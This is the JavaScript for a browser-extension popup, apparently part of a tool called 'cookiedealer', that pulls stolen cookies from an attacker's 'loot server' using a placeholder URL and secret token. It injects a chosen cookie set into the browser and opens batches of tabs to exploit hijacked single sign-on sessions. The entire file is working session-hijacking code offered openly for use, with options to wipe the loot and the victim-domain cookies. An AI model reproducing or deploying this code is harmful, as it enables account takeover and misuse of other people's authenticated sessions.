/*
Options
IMPORTANT: Change these for your setup
*/
//This is the server backend you've setup, where we can get the stolen cookies as JSON
const loot_server_url = "http://<YOUR_SERVER_HERE>/cookiedealer/data.php?token=<YOUR_SECRET_ATTACKER_TOKEN_HERE>";
//For now the following variable will be used to delete the cookies of this domain in the browser... 
//TODO: Delete cookies depending on how they were added to the browser's cookie store
const attacked_domain = "<ATTACKED_DOMAIN_HERE>"; 
//The following URLs will open on button press...
//Especially interesting to open many company URLs if you stole a single sign on cookie set to the parent domain
const urls_one = [
  "https://example.org/",
  "http://example.org/"
];
const urls_two = [
  "https://example.org/more",
  "http://example.org/more"
];
const urls_three = [
  "https://example.org/evenmore",
  "http://example.org/evenmore"
];

/*
End Options
*/

const refreshButton = document.querySelector("#refreshbtn");
const deleteSrvButton = document.querySelector("#deletesrvbtn");
const deleteBrwButton = document.querySelector("#deletebrwbtn");
const openBasicButton = document.querySelector("#openbasic");
const openMoreButton = document.querySelector("#openmore");
const openEvenMoreButton = document.querySelector("#openevenmore");
const dropdownBox = document.querySelector("#dropdown");
const content = document.querySelector("#content");

//Global cookie data:
var cookiesets = [];

//Setting cookies
function onSet(cookie) {
  console.log(`Set cookie successfully: ${cookie.name}`);
}

function onRemoved(cookie) {
  console.log(`Removed cookie successfully: ${cookie.name}`);
}

function onDeleteError(error) {
  console.log(`Error setting cookie: ${error}`);
}

function onSetError(error) {
  console.log(`Error setting cookie: ${error}`);
}

function deleteCookies(cookies) {
  for (let cookie of cookies) {
    var removing = browser.cookies.remove({
       url: "http://"+cookie.domain, //actually it doesn't matter which protocol (http/https) we specify...
       name: cookie.name
      });
      removing.then(onRemoved, onDeleteError);
  }
}

function deleteCookiesForDomain(domain){
    var gettingAllDomain = browser.cookies.getAll({
      url: "http://"+domain //actually it doesn't matter which protocol (http/https) we specify...
    });
    gettingAllDomain.then(deleteCookies, onDeleteError);
}

function setCookie(url, name, value){
    var setting_promise = browser.cookies.set({
      url: url,
      name: name,
      value: value
    });

    setting_promise.then(onSet, onSetError);
}

function clearContent(){
    while (dropdownBox.hasChildNodes()) {
        dropdownBox.removeChild(dropdownBox.firstChild);
    }
    dropdownBox.innerHTML = "";
    opt = document.createElement("option"); 
    opt.text = "";
    opt.value = "";
    dropdownBox.options.add(opt);
}

//Getting JSON from server
function receivedServerData(data){
    console.log(data);
    clearContent();
    cookiesets = JSON.parse(data);
    for (var i = 0; i < cookiesets.length; i++) {
        cookieset = cookiesets[i];
        //console.log(cookieset["name"]);
        //console.log(cookieset["description"]);
        all_cookie_names = [];
        cookies = cookieset["cookies"];
        for (var k = 0; k < cookies.length; k++) {
            cookie = cookies[k];
            domain = cookie["domain"];
            //console.log(domain);
            cname = cookie["name"];
            all_cookie_names.push(domain + "-" + cname);
            //console.log(cname);
            //cvalue = cookie["value"];
            //console.log(cvalue);
        }
        opt = document.createElement("option"); 
        opt.text = cookieset["name"] + " (" + all_cookie_names.join(", ") + ")";
        opt.value = i;
        dropdownBox.options.add(opt);
    }
}

function getXmlHttpObject(){
    var xmlHttpObject = false;
    if (typeof XMLHttpRequest != 'undefined') {
        xmlHttpObject = new XMLHttpRequest();
    }
    if (!xmlHttpObject) {
        try {
            xmlHttpObject = new ActiveXObject("Msxml2.XMLHTTP");
        }
        catch(e) {
            try {
                xmlHttpObject = new ActiveXObject("Microsoft.XMLHTTP");
            }
            catch(e) {
                xmlHttpObject = null;
            }
        }
    }
    return xmlHttpObject;
}

function getServerData(){
    var xmlHttpObject = getXmlHttpObject();    
    xmlHttpObject.onreadystatechange = function() {
        if (xmlHttpObject.readyState == 4) {
            receivedServerData(xmlHttpObject.responseText);
        }
        else{
            console.log(`Retrieving server data... readyState is ${xmlHttpObject.readyState}`);
        }
    }
    xmlHttpObject.open("GET", loot_server_url);
    xmlHttpObject.send();
}

function deleteSrvData(){
    var xmlHttpObject = getXmlHttpObject();    
    xmlHttpObject.onreadystatechange = function() {
        if (xmlHttpObject.readyState == 4) {
            receivedServerData(xmlHttpObject.responseText);
        }
        else{
            console.log(`Deleting server data... readyState is ${xmlHttpObject.readyState}`);
        }
    }
    xmlHttpObject.open("GET", loot_server_url + "&DELETE=1");
    xmlHttpObject.send();
    
    getServerData();
}

function deleteBrwData(){
    //delete all old cookies
    deleteCookiesForDomain(attacked_domain);
    content.innerText = "";
}

function changeCookieSet(){
    if(dropdownBox.value.length != 0){
        cookieset = cookiesets[dropdownBox.value];
        
        cookies = cookieset["cookies"];
        for (var k = 0; k < cookies.length; k++) {
            cookie = cookies[k];
            console.log("Setting cookie " + cookie["name"]);
            setCookie("http://" + cookie["domain"], cookie["name"], cookie["value"]);
        }
        //Some cosmetics in the UI follows...
        dropdownBox.options.selectedIndex = 0;
        content.innerText = "Last chosen entry: \n" + cookieset["description"];
        
    }
}

/*
Three convenience functions which can be used to open certain URLs.
This is helpful in the case of a hijacked single sign on cookie that is valid for a lot of URLs.
Simply specify the URLs 
*/

function openBasicUrls(){
    urls_one.reverse();
    for (var i = 0; i < urls_one.length; i++) {
        var creating = browser.tabs.create({
          url: urls_one[i]
        });
    }
}

function openMoreUrls(){
    for (var i = 0; i < urls_two.length; i++) {
        var creating = browser.tabs.create({
          url: urls_two[i]
        });
    }
}

function openEvenMoreUrls(){
    for (var i = 0; i < urls_three.length; i++) {
        var creating = browser.tabs.create({
          url: urls_three[i]
        });
    }
}

refreshButton.addEventListener('click', function(event) {
    getServerData();
});

deleteSrvButton.addEventListener('click', function(event) {
    deleteSrvData();
});

deleteBrwButton.addEventListener('click', function(event) {
    deleteBrwData();
});

openBasicButton.addEventListener('click', function(event) {
    openBasicUrls();
});

openMoreButton.addEventListener('click', function(event) {
    openMoreUrls();
});

openEvenMoreButton.addEventListener('click', function(event) {
    openEvenMoreUrls();
});

dropdownBox.addEventListener('change', function(event) {
    changeCookieSet();
});

getServerData();